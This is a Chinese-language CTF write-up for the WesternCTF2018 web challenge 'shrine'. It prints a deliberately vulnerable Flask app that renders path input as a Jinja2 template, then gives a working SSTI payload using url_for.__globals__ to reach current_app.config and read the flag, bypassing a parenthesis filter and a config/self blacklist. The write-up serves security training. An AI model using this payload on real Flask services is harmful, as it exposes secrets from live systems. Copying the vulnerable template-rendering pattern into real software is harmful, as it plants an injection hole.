---
title: WesternCTF2018 - Web - shrine
date: 2026-11-14 18:27:00
categories:
  - CTF
  - WesternCTF2018
  - Web
tags:
  - Flask SSTI
  - 模板注入
  - 黑名单绕过
  - 沙箱逃逸
cover: /img/cover/girl-wading-rainy-street.jpg
description: WesternCTF2018 Web 题，根路径泄漏 Flask 源码；shrine 存在 SSTI 却删括号并置空 config，借 url_for 拿 current_app 读 FLAG 绕过。
keywords:
  - SSTI
  - Jinja2
  - Flask
  - url_for
  - 黑名单绕过
ai: >-
  本题是 WesternCTF2018 的 Web 题 shrine，难度 Easy。访问站点根路径即可读到完整 Flask 应用源码：FLAG 被写入 app.config 的 FLAG 键，而 shrine 路由把用户可控的路径片段交给 render_template_string 渲染，构成服务端模板注入。防御方先删除输入里的左右括号以禁用函数调用，再用 set 语句把 config 与 self 两个裸变量名覆盖为 None。利用链的关键在于 url_for 是模板全局函数，其 __globals__ 字典里保存着 current_app，通过属性访问 .config 不受把裸变量名置空的影响，再用字典下标 FLAG 代替被过滤的括号完成读取，最终在响应中拿到 flag。整体考察 SSTI 沙箱逃逸中属性与字典访问替代函数调用以及黑名单绕过的思路。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | WesternCTF2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

访问 `/` 直接返回源码（`open(__file__).read()`），属源码泄漏。题目与练习场的 ID、friendly_id 等标识已脱敏。

```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))
```

## 漏洞分析

漏洞类型：Flask SSTI（模板注入）+ 黑名单绕过 + 括号过滤绕过。

关键点：

1. flag 在 `app.config['FLAG']`（从环境变量 `FLAG` 读取）。
2. `/shrine/<path:shrine>` 把路径作为 Jinja2 模板渲染 → SSTI。
3. **黑名单**：`config`、`self` 被前置 `{% set config=None%}{% set self=None%}` 覆盖为 None。
4. **过滤 `(` 和 `)`**：不能用函数调用。

## 利用过程

绕过思路：

- `(` `)` 被过滤 → 用**字典下标** `['...']` 代替函数调用。
- `config` 黑名单 → 通过 `url_for.__globals__['current_app'].config` 的**属性访问**（`.config`），不受 `set config=None` 影响。

`url_for` 是 Flask 全局函数，`url_for.__globals__` 是其全局命名空间字典，包含 `current_app`；`current_app.config['FLAG']` 直接读取 flag。

```http
GET /shrine/{{url_for.__globals__['current_app'].config['FLAG']}} HTTP/1.1
Host: target:8080
```

响应正文即返回 flag。

## 完整 EXP

payload 归档内容并入本节。访问 `/` 拿到源码，确认 flag 在 `app.config['FLAG']`，绕过括号过滤与 config / self 黑名单后的最终请求：

```http
GET /shrine/{{url_for.__globals__['current_app'].config['FLAG']}} HTTP/1.1
Host: target:8080
```

## Flag

```text
flag{xxxx}
```

（服务端响应中返回，真实值已脱敏。）

## 踩坑与总结

1. 源码泄漏（`/` 返回 `__file__`）是突破口，先读源码再定利用链。
2. SSTI 通过 `url_for.__globals__` 访问 `current_app.config`。
3. 用字典下标 `['FLAG']` 绕过括号过滤。
4. 用 `.config` 属性访问绕过 `config` 黑名单（`set config=None` 只影响裸变量名）。
